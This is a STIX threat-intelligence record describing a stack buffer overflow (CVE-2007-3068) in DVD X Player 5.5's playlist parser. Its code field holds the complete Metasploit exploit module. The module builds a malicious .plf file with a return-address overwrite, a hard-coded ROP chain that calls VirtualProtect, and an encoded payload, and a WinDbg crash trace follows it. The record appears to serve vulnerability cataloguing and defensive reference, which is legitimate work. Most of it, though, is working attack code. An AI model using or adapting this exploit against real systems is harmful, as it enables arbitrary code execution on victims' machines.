{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4bb4c1d0-e615-4c26-a291-a5b0ebd88dcc",
    "created": "2024-08-14T16:38:12.718021Z",
    "modified": "2024-08-14T16:38:12.718025Z",
    "name": "\"DVD X Player 5.5 .plf PlayList Buffer Overflow\"",
    "description": " This module exploits a stack-based buffer overflow on DVD X Player 5.5 Pro and Standard.  By supplying a long string of data in a plf file (playlist), the MediaPlayerCtrl.dll component will attempt to extract a filename out of the string and then copy it on the stack without any proper bounds checking, which causes a buffer overflow, and results in arbitrary code execution under the context of the user.  This module has been designed to target common Windows systems such as: Windows XP SP2/SP3, Windows Vista, and Windows 7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/dvdx_plf_bof.rb",
            "external_id": "dvdx_plf_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3068"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"DVD X Player 5.5 .plf PlayList Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow on DVD X Player 5.5 Pro and\n        Standard.  By supplying a long string of data in a plf file (playlist), the\n        MediaPlayerCtrl.dll component will attempt to extract a filename out of the string,\n        and then copy it on the stack without any proper bounds checking, which causes a\n        buffer overflow, and results in arbitrary code execution under the context of the user.\n\n          This module has been designed to target common Windows systems such as:\n        Windows XP SP2/SP3, Windows Vista, and Windows 7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'n00b',      #Initial discovery, poc for 4.1\n          'D3r K0n!G', #Proof-of-concept for 5.5\n          'sickness',  #ROP\n          'sinn3r',    #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-3068' ],\n          [ 'OSVDB', '36956' ],\n          [ 'BID', '24278' ],\n          [ 'EDB', '17745' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x1a\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"seh\",  #none/process/seh\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'DVD X Player 5.5 Standard / Pro',\n            {\n              'Offset' => 260,        #To EIP\n              'Ret'    => 0x61626702, #POP EAX; RET [EPG.dll]\n              'Max'    => 2000,       #Max buffer size\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-06-02',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [false, 'The file name', 'msf.plf'])\n        ])\n  end\n\n  def exploit\n    rop = [\n      0x10011108,  #VirtualProtect IAT [SkinScrollBar.dll]\n      0x616306ed,  #MOV EAX, DWORD PTR DS:[EAX]; RET [EPG.dll]\n      0x616385d8,  #XCHG EAX,ESI; RETN 0 [EPG.dll]\n      0x6162d202,  #POP EBP; RET [EPG.dll]\n      0x6160cac8,  #PUSH ESP [EGP.dll]\n      0x61626702,  #POP EAX; RET [EGP.dll]\n      0xfffffaff,  #Value to negate, will become 0x00000501\n      0x61627d9c,  #NEG EAX; RET [epg.dll]\n      0x61640124,  #XCHG EAX,EBX; RET [EPG.dll]\n      0x61626702,  #POP EAX; RET [EPG.dll]\n      0xffffffc0,  #Value to negate, will become 0x00000040\n      0x61627d9c,  #NEG EAX; RET [EPG.dll]\n      0x61608ba2,  #XCHG EAX,EDX; RET [EPG.dll]\n      0x6160b804,  #POP ECX; RET [EPG.dll]\n      0x6164b001,  #Writable location [EPG.dll]\n      0x6162e587,  #POP EDI; RET [EPG.dll]\n      0x6163081d,  #ROP NOP  [EPG.dll]\n      0x61626702,  #POP EAX; RET [EPG.dll]\n      0x90909090,\n      0x61620831,  #PUSHAD; RET [EPG.dll]\n    ].pack('V*')\n\n    buf  = ''\n    buf << rand_text_alpha(target['Offset'])\n    buf << [target.ret].pack('V')\n    buf << rand_text_alpha(16)\n    buf << rop\n    buf << make_nops(15)\n    buf << payload.encoded\n    buf << rand_text_alpha(target['Max']-buf.length)\n\n    print_status(\"Creating #{datastore['FILENAME']}...\")\n    file_create(buf)\n  end\nend\n\n=begin\n6400cd42 ffd3            call    ebx {SHLWAPI!PathFindFileNameA (77f6c19c)}\n0:000> p\neax=0406a15c ebx=77f6c19c ecx=00001300 edx=040600d0 esi=00000001 edi=6405362c\neip=6400cd44 esp=0012f488 ebp=00eafce0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nMediaPlayerCtrl+0xcd44:\n6400cd44 8b8dec000000    mov     ecx,dword ptr <Unloaded_ionInfo.dll>+0xeb (000000ec)[ebp] ss:0023:00eafdcc=040600d0\n0:000> dd eax\n0406a15c  41414141 41414141 41414141 41414141\n0406a16c  41414141 41414141 41414141 41414141\n0406a17c  41414141 41414141 41414141 41414141\n0406a18c  41414141 41414141 41414141 41414141\n0406a19c  41414141 41414141 41414141 41414141\n0406a1ac  41414141 41414141 41414141 41414141\n0406a1bc  41414141 41414141 41414141 41414141\n0406a1cc  41414141 41414141 41414141 41414141\n0:000> g\nBreakpoint 2 hit\neax=0406a15c ebx=77f6c19c ecx=040600d0 edx=040600d0 esi=00000001 edi=6405362c\neip=6400cd4e esp=0012f47c ebp=00eafce0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nMediaPlayerCtrl+0xcd4e:\n6400cd4e ff17            call    dword ptr [edi]      ds:0023:6405362c=6400d890\n0:000> g\n(464.c0c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00001389 ebx=040600d0 ecx=00000177 edx=0406a15c esi=0406af08 edi=00130000\neip=6400dd50 esp=0012f234 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216\nMediaPlayerCtrl!DllCreateObject+0x220:\n6400dd50 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:000> !address 6400dd50\n    64000000 : 64001000 - 0004e000\n                    Type     01000000 MEM_IMAGE\n                    Protect  00000020 PAGE_EXECUTE_READ\n                    State    00001000 MEM_COMMIT\n                    Usage    RegionUsageImage\n                    FullPath C:\\Program Files\\Aviosoft\\DVD X Player 5.5 Standard\\MediaPlayerCtrl.dll\n=end\n",
    "x_mitre_disclosure_date": "2007-06-02",
    "x_mitre_platforms": [
        "win'"
    ]
}